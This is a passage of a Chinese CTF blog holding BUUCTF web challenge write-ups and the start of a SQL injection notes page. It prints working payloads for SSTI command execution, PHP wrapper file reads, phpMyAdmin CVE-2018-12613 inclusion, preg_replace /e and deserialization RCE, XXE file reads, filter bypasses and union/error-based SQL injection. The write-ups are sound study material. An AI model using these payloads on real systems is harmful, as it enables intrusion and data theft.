href="https://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">参考：https://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93</a></p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>进入界面显示本地IP地址</p><p>抓包，发X-Forwarded-For，改变显示</p><p>尝试sql注入，无果(down了)</p><p>尝试ssti模板注入，有回显，且无过滤</p><p>payload:</p><div class="hljs code-wrapper"><pre><code>&#123;&#123;system('ls')&#125;&#125;&#123;&#123;system('ls /')&#125;&#125;//get flag&#123;&#123;system('cat /flag')&#125;&#125;</code></pre></div><p>…知识面还是不够广，容易宕机…</p><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="git文件泄露"><a href="#git文件泄露" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h2><p>用GitHack down下所泄露的文件</p><div class="hljs code-wrapper"><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;                // echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;</code></pre></div><p>分析源码</p><p>1.ban了data、filter、php、phar常用伪协议<br>2.很经典的正则匹配无参数RCE，(?R)?表示的是引用当前表达式一次或多次。有效的payload形式是令函数作为参数 套娃：a(b())<br>传入的参数只能包括小写字母、下划线、逗号、括号，还要以;结尾<br>3.ban掉了一些关键字</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>1.先读取目录</p><div class="hljs code-wrapper"><pre><code>//读取当前目录---&gt;flag.php index.php print_r(scandir(pos(localeconv())));</code></pre></div><p>2.读文件</p><div class="hljs code-wrapper"><pre><code>//show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre></div><h2 id="其他解法（session-id-实现任意文件读取）"><a href="#其他解法（session-id-实现任意文件读取）" class="headerlink" title="其他解法（session_id()实现任意文件读取）"></a>其他解法（session_id()实现任意文件读取）</h2><p>…(没完全看懂，就不写了)</p><p><a href="https://www.cnblogs.com/LLeaves/p/12868440.html">https://www.cnblogs.com/LLeaves/p/12868440.html</a></p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~<br>涓嶄俊浣犳壘</p><p>…</p><p>—&gt;robots.txt—&gt;Disallow: phpinfo.php—&gt;不会分析 down </p><p>—&gt;扫一下—&gt;phpmyadmin…</p><p>…</p><h2 id="CVE-2018-12613-phpMyadmin-CVE-2018-12613-后台任意文件包含漏洞"><a href="#CVE-2018-12613-phpMyadmin-CVE-2018-12613-后台任意文件包含漏洞" class="headerlink" title="CVE-2018-12613 phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞"></a>CVE-2018-12613 phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</h2><p><a href="https://www.xiinnn.com/article/e7c68814.html">https://www.xiinnn.com/article/e7c68814.html</a></p><p>payload:</p><div class="hljs code-wrapper"><pre><code>//抄作业phpmyadmin/?target=db_sql.php%253f/../../../../../../../../flag</code></pre></div><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><div class="hljs code-wrapper"><pre><code>&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  //next.php&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre></div><p>审计源码</p><p>伪协议绕过</p><div class="hljs code-wrapper"><pre><code>/?text=data://text/plain,I+have+a+dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></pre></div><p>读出next.php</p><div class="hljs code-wrapper"><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#39;/(&#39; . $re . &#39;)/ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;//$re参数的key，$str就是参数的value    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre></div><h2 id="preg-replace-e-模式下的代码漏洞问题"><a href="#preg-replace-e-模式下的代码漏洞问题" class="headerlink" title="preg_replace() /e 模式下的代码漏洞问题"></a>preg_replace() /e 模式下的代码漏洞问题</h2><p><a href="http://www.xinyueseo.com/websecurity/158.html">附上博客：http://www.xinyueseo.com/websecurity/158.html</a><br><a href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">附上博客：http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a href="https://xz.aliyun.com/t/2557">附上博客：https://xz.aliyun.com/t/2557</a></p><p>preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</p><p>php5.5.0 后/e 修饰符已经被弃用了</p><h2 id="正则匹配的-反向引用"><a href="#正则匹配的-反向引用" class="headerlink" title="正则匹配的 反向引用"></a>正则匹配的 反向引用</h2><p>对一个正则表达式模式或部分模式,两边添加圆括号,将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数  </p><h2 id="strtolower-“-1”"><a href="#strtolower-“-1”" class="headerlink" title="strtolower(“\1”)"></a>strtolower(“\1”)</h2><p>所以这里的 1 实际上指定的是第一个子匹配项</p><p><a href="http://www.xinyueseo.com/websecurity/158.html">附上博客：http://www.xinyueseo.com/websecurity/158.html</a><br><a href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">附上博客：http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a href="https://xz.aliyun.com/t/2557">附上博客：https://xz.aliyun.com/t/2557</a></p><h2 id="PHP-当非法字符为首字母时，只有点号会被替换成下划线"><a href="#PHP-当非法字符为首字母时，只有点号会被替换成下划线" class="headerlink" title="PHP:当非法字符为首字母时，只有点号会被替换成下划线"></a>PHP:当非法字符为首字母时，只有点号会被替换成下划线</h2><p><img src="/2021/10/21/BUU/ZJCTF-1.png"></p><p>这里解释下用\S*而不是用.*的原因：<br>因为在php中，对于传入非法的$_GET参数名，会将其转换为下划线，导致正则匹配失效<br>所以我们只能使用\S*或者\S%2b来进行构造payload</p><p>payload </p><div class="hljs code-wrapper"><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre></div><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>index.php 存在php报错</p><p>分析源码，抓包</p><div class="hljs code-wrapper"><pre><code>func=&amp;p=</code></pre></div><p>获取两个上传变量，猜测后端语句</p><div class="hljs code-wrapper"><pre><code>$func($p);</code></pre></div><p>尝试直接执行系统命令，回显hacker…，尝试执行其他函数，读文件获取相关信息，报错</p><div class="hljs code-wrapper"><pre><code>call_user_func() expects parameter 1 to be a valid callback, function &#39;xxx&#39; not found or invalid function name in /var/www/html/index.php on line 24</code></pre></div><p>更新猜测</p><div class="hljs code-wrapper"><pre><code>call_user_func($func,$p);</code></pre></div><p>读取源码</p><div class="hljs code-wrapper"><pre><code>func=file_get_contents&amp;p=index.php</code></pre></div><p>部分源码</p><div class="hljs code-wrapper"><pre><code>$disable_fun=&#123;...&#125; function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;</code></pre></div><p>尝试寻找函数绕过…ban 的有点多<br>发现(无用)类Test，没有ban serialize，其销毁方法也调用了执行函数，尝试反序列化</p><p>exp </p><div class="hljs code-wrapper"><pre><code>&lt;?phpclass Test &#123;    var $p = &quot;ls /&quot;;    var $func = &quot;system&quot;;&#125;$a= new Test();print_r(serialize($a));</code></pre></div><p>find / -name flag*<br>找到一堆… </p><p>在/tmp/flagoefiu4r93中..</p><p>payload</p><div class="hljs code-wrapper"><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre></div><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><img src="/2021/10/21/BUU/phpweb-1.png"></p><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><div class="hljs code-wrapper"><pre><code>/www.tar.gz下载源码</code></pre></div><p>用D盾扫出了一堆…</p><p><img src="/2021/10/21/BUU/goodhacker-1.png"></p><p>写脚本遍历危险函数，测试可用性，确定利用点</p><div class="hljs code-wrapper"><pre><code>import osimport reimport requestsimport threadingdirr = &#39;&#39;files = os.listdir(dirr)                                # 获取文件夹下的文件reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # 设置正则匹配def thread1():    for i in files:  # 循环文件        print(&quot;----------------------&quot;, i)        url = &quot;&quot;  # url (docker适配的php版本)        f = open(dirr + i)  # 打开这个文件        data = f.read()  # 读取文件内容        f.close()  # 关闭文件        result = reg.findall(data)  # 从文件内容中找到GET请求        for j in result:  # 循环GET参数            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # 尝试请求次路径，并执行命令            print(payload)            html = requests.get(payload)            if &quot;123456&quot; in html.text:                print(&quot;*****************************&quot;, payload)                exit(1)p1 = threading.Thread(target=thread1())p1.start()</code></pre></div><p>尝试多进程加速<br>有亿点丑，但有效<br>编码能力还需要改进   </p><div class="hljs code-wrapper"><pre><code>import osimport reimport timeimport requestsimport threadingdirr = &#39;&#39;files1 = os.listdir(dirr)                               # 获取文件夹下的文件files2 = os.listdir(dirr)                               # 获取文件夹下的反序文件files2.sort()files2.reverse()reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # 设置正则匹配def thread1(files, a):    for i in files:                                     # 循环文件        if a == 1:            print(&quot;1111111----------------------&quot;, i)        elif a == 2:            print(&quot;2222222----------------------&quot;, i)        url = &quot;&quot;             # url (docker适配的php版本)        f1 = open(dirr + i)                             # 打开这个文件        data = f1.read()                                # 读取文件内容        f1.close()                                      # 关闭文件        result = reg.findall(data)                      # 从文件内容中找到GET请求        for j in result:                                # 循环GET参数            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # 尝试请求次路径，并执行命令            print(payload)            html = requests.get(payload)            if &quot;123456&quot; in html.text:                print(&quot;*****************************&quot;, payload)                exit(1)p1 = threading.Thread(target=thread1, args=(files1, 1))p2 = threading.Thread(target=thread1, args=(files2, 2))p1.start()p2.start()</code></pre></div><p>payload </p><div class="hljs code-wrapper"><pre><code>/xk0SzyKwfzw.php?Efa5BVG=cat+/flag</code></pre></div><h2 id="python-不可变对象"><a href="#python-不可变对象" class="headerlink" title="python 不可变对象"></a>python 不可变对象</h2><p>可变对象–字典，集合，列表</p><p>共用一个地址</p><p>不可变对象–数字，字符串，元组，不可变集合</p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>(一个做的很不错的前端)</p><p>发现   ?message=   和界面最后的  dog</p><p>审计源码，尝试sql、ssti，无果</p><h2 id="git文件泄露-1"><a href="#git文件泄露-1" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h2><p>GitHack    </p><p>down 不下index.php 和 flag.php…(不知道为啥..还重装了两遍)</p><h2 id="exit-输出一条消息并退出当前脚本"><a href="#exit-输出一条消息并退出当前脚本" class="headerlink" title="exit($) 输出一条消息并退出当前脚本"></a>exit($) 输出一条消息并退出当前脚本</h2><h2 id="php-变量覆盖"><a href="#php-变量覆盖" class="headerlink" title="php 变量覆盖"></a>php 变量覆盖</h2><p>—&gt; index.php</p><div class="hljs code-wrapper"><pre><code>&lt;?phpinclude &#39;flag.php&#39;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y)&#123;            $$x = $y;                        &#125;foreach($_GET as $x =&gt; $y)&#123;                $$x = $$y;                        &#125;//get handsome=flag//$yds=$flagforeach($_GET as $x =&gt; $y)&#123;                if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;        //这个if绕不过去--&gt;无法输出$handsome--&gt;$handsome!=flag        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    //尝试变量yds---&gt;get flag---&gt;game over    exit($yds);&#125;if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;    //...get is=flag&amp;flag=flag    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre></div><p>—&gt;flag.php</p><div class="hljs code-wrapper"><pre><code>&lt;?php$flag = file_get_contents(&#39;/flag&#39;);</code></pre></div><p>payload</p><div class="hljs code-wrapper"><pre><code>?yds=flag//?is=flag&amp;flag=flag</code></pre></div><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>选择按钮，展示图片，url–&gt;?category=</p><p>猜测为include，尝试伪协议</p><div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre></div><p>报错</p><div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index</code></pre></div><p>读到index，仅截取php部分</p><div class="hljs code-wrapper"><pre><code>&lt;?php    $file = $_GET[&#39;category&#39;];    if(isset($file))    &#123;            //判断woofers/meowers/index在$file中第一次出现的位置---&gt;尝试绕过strops/构造payload        if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                include ($file . &#39;.php&#39;);        &#125;        else&#123;            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;        &#125;    &#125;    ?&gt;</code></pre></div><p>尝试读/flag、ls、eval…</p><p>html下flag.php…</p><h2 id="strpos-查找字符串在另一字符串中第一次出现的位置"><a href="#strpos-查找字符串在另一字符串中第一次出现的位置" class="headerlink" title="strpos() 查找字符串在另一字符串中第一次出现的位置"></a>strpos() 查找字符串在另一字符串中第一次出现的位置</h2><h2 id="路径拼接读当前目录语句-index-flag"><a href="#路径拼接读当前目录语句-index-flag" class="headerlink" title="路径拼接读当前目录语句 index/../flag"></a>路径拼接读当前目录语句 index/../flag</h2><p>payload</p><div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index/../flag</code></pre></div><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>url–&gt;index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</p><p>TXpVek5UTTFNbVUzTURabE5qYz0<br>两次base64解码—&gt;十六进制转字符串—&gt;555.png</p><p>同理<br>index.php<br>字符串转十六进制—&gt;两次base64编码—&gt;得到index.php的base64</p><p>得到index.php源码</p><div class="hljs code-wrapper"><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text/html;charset=utf-8&#39;);$cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;</code></pre></div><p>md5真实碰撞，翻博客…</p><h2 id="ls过滤用dir"><a href="#ls过滤用dir" class="headerlink" title="ls过滤用dir"></a>ls过滤用dir</h2><p>…才知道…</p><p>dir 当前目录下无 flag</p><p>dir+/</p><p>根目录下flag</p><h2 id="特殊字符的使用"><a href="#特殊字符的使用" class="headerlink" title="特殊字符的使用"></a>特殊字符的使用</h2><p>ca\t 后面的\t会成为 TAB 而绕过</p><p>payload </p><div class="hljs code-wrapper"><pre><code>ca\t+/flag</code></pre></div><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><div class="hljs code-wrapper"><pre><code>function doLogin()&#123;var username = $(&quot;#username&quot;).val();var password = $(&quot;#password&quot;).val();if(username == &quot;&quot; || password == &quot;&quot;)&#123;    alert(&quot;Please enter the username and password!&quot;);    return;&#125;var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123;    type: &quot;POST&quot;,    url: &quot;doLogin.php&quot;,    contentType: &quot;application/xml;charset=utf-8&quot;,    data: data,    dataType: &quot;xml&quot;,    anysc: false,    success: function (result) &#123;        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;        if(code == &quot;0&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);        &#125;else if(code == &quot;1&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);        &#125;else&#123;            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);        &#125;    &#125;,    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);    &#125;&#125;); &#125;</code></pre></div><p>抓包…没见过…  </p><div class="hljs code-wrapper"><pre><code>&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></pre></div><p>测试sql无回显，尝试xss， 无果</p><p>—&gt;XXE—XML外部实体注入</p><h2 id="XXE—XML外部实体注入"><a href="#XXE—XML外部实体注入" class="headerlink" title="XXE—XML外部实体注入"></a>XXE—XML外部实体注入</h2><p>XML文件在引用外部实体时候,可以沟通构造恶意内容,可以导致读取任意文件,命令执行和对内网的攻击,这就是XXE漏洞</p><p>payload </p><div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre></div><p>解释payload</p><div class="hljs code-wrapper"><pre><code>//先添加xml文件头：称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot;?&gt;standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项按实体有无参分类，实体分为一般实体和参数实体，一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机因为将file:///flag命名为admin，所以下面用&amp;admin;</code></pre></div><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><div class="hljs code-wrapper"><pre><code>&#123;&#123;7*7&#125;&#125;确定ssti</code></pre></div><h2 id="ssti-Smarty"><a href="#ssti-Smarty" class="headerlink" title="ssti Smarty"></a>ssti Smarty</h2><div class="hljs code-wrapper"><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></pre></div><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1>]]></content>
    
    
    
    <tags>
      
      <tag>web buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql-ways</title>
    <link href="/2021/07/24/sql-ways/"/>
    <url>/2021/07/24/sql-ways/</url>
    
    <content type="html"><![CDATA[<p>sql注入相关方法/问题</p><span id="more"></span><h1 id="sql注入方式"><a href="#sql注入方式" class="headerlink" title="sql注入方式"></a>sql注入方式</h1><h1 id="常规手注"><a href="#常规手注" class="headerlink" title="常规手注"></a>常规手注</h1><p>所用库：<br>information_schema    </p><p>information_schema   数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。<br>information_schema  保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p><p>所用表：<br>information_schema.tables<br>information_schema.columns</p><p>所用字段：  （查询//数据源）<br>information_schema.tables  –&gt; table_name // table_schema</p><p>information_schema.columns  –&gt; column_name // table_name</p><div class="hljs code-wrapper"><pre><code>1.确认注入点union select 1,2,3;#2.查库union select 1,2,group_concat(database())#3.查表union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#4.查列union select 1,2,group_concat(column_name) from information_schmea.columnswhere table_name=()#5.查字段union select 1,2,group_concat()from ()#</code></pre></div><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><img src="/2021/07/24/sql-ways/updatexml.png"> </p><p>注入姿势：</p><div class="hljs code-wrapper"><pre><code>updatexml(1,concat(0x7e,(select语句),0x7e),1)</code></pre></div><p>详见 buu-1mark [极客大挑战 2019]HardSQL  </p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue(目标xml文档，xml路径)</p><p>函数的第二个参数是可以进行操作的地方，xml文件中查询使用的是/xx/xx/的格式，如果我们写成其他的格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法格式的内容就是我们想要查询的内容</p><p>注入姿势：</p><div class="hljs code-wrapper"><pre><code>&#39; and extractvalue(1,concat(0x5c,(select database())))#&#39; and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;&#39;)))#</code></pre></div><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>数据库的多条语句执行(;;;;;)</p><p>实际应用场景中,堆叠注入遇到的会很少，大部分会在CTF比赛中遇到。主要原因是，堆叠注入的利用看起来很厉害但是其可能会受到 API、数据库引擎或者权限的控制。只有当调用函数库函数支持执行多条语句执行的时候才可以利用</p><p>如利用mysql_multi_query()函数就支持多条SQL语句同时执行,实际情况中如PHP的防SQL注入机制,其使用的数据库函数为 “mysqli_query()”函数。 所以说堆叠注入的使用条件比较有局限性。但是一旦可以被使用，造成的伤害则是非常巨大的</p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><strong>原理/核心：<br>存在T/F可区分的回显，对所需要的每一个字符进行T/F判断</strong>  </p><p>所使用的函数：  </p><p>取字符： <strong>substr</strong>///</p><p>进行判断： <strong>ascii</strong>///<strong>char</strong>///<strong>ord</strong></p><p>基本语句：  </p><p>select</p><p>substr((select),{},1)</p><p>ascii(substr((select),{},1))={}</p><h1 id="异或-注入"><a href="#异或-注入" class="headerlink" title="异或^注入"></a>异或^注入</h1><div class="hljs code-wrapper"><pre><code>0^0=01^1=00^1=11^0=1//相同为0，不同为1</code></pre></div><p><strong>例：[极客大挑战 2019]FinalSQL</strong></p><h1 id="md5-ffifdyop"><a href="#md5-ffifdyop" class="headerlink" title="md5()  ffifdyop"></a>md5()  ffifdyop</h1><div class="hljs code-wrapper"><pre><code>$sql= &quot;SELECT * FROM admin WHERE pass = &#39;&quot;.md5($password,true).&quot; &#39; &quot;思路比较明确，当md5后的hex转换成字符串后，如果包含&#39;or&#39;这样的字符串，那整个sql变成SELECT * FROM admin WHEREpass=&#39;&#39;or&#39;6&#39;///---&gt;ffifdyopmd5后，276f722736c95d99e921722cf9ed621c再转成字符串：&#39;or&#39;6</code></pre></div><p><a href="https://err0r.top/article/md5/?highlight=md5">附上一篇err0r师傅的md5比较：https://err0r.top/article/md5/?highlight=md5</a> </p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用编码方式的不同，借用转义函数，将转义函数添加的\转换为宽字节，造成’的逃逸</p><p>%df’ =&gt; %df&#39; =&gt; %df%5c’ =&gt; 運’ =&gt; 造成’的逃逸</p><p>转义函数<br>addslashes，mysql_real_escape_string，mysql_escape_string</p><p>宽字节注入指的是 mysql 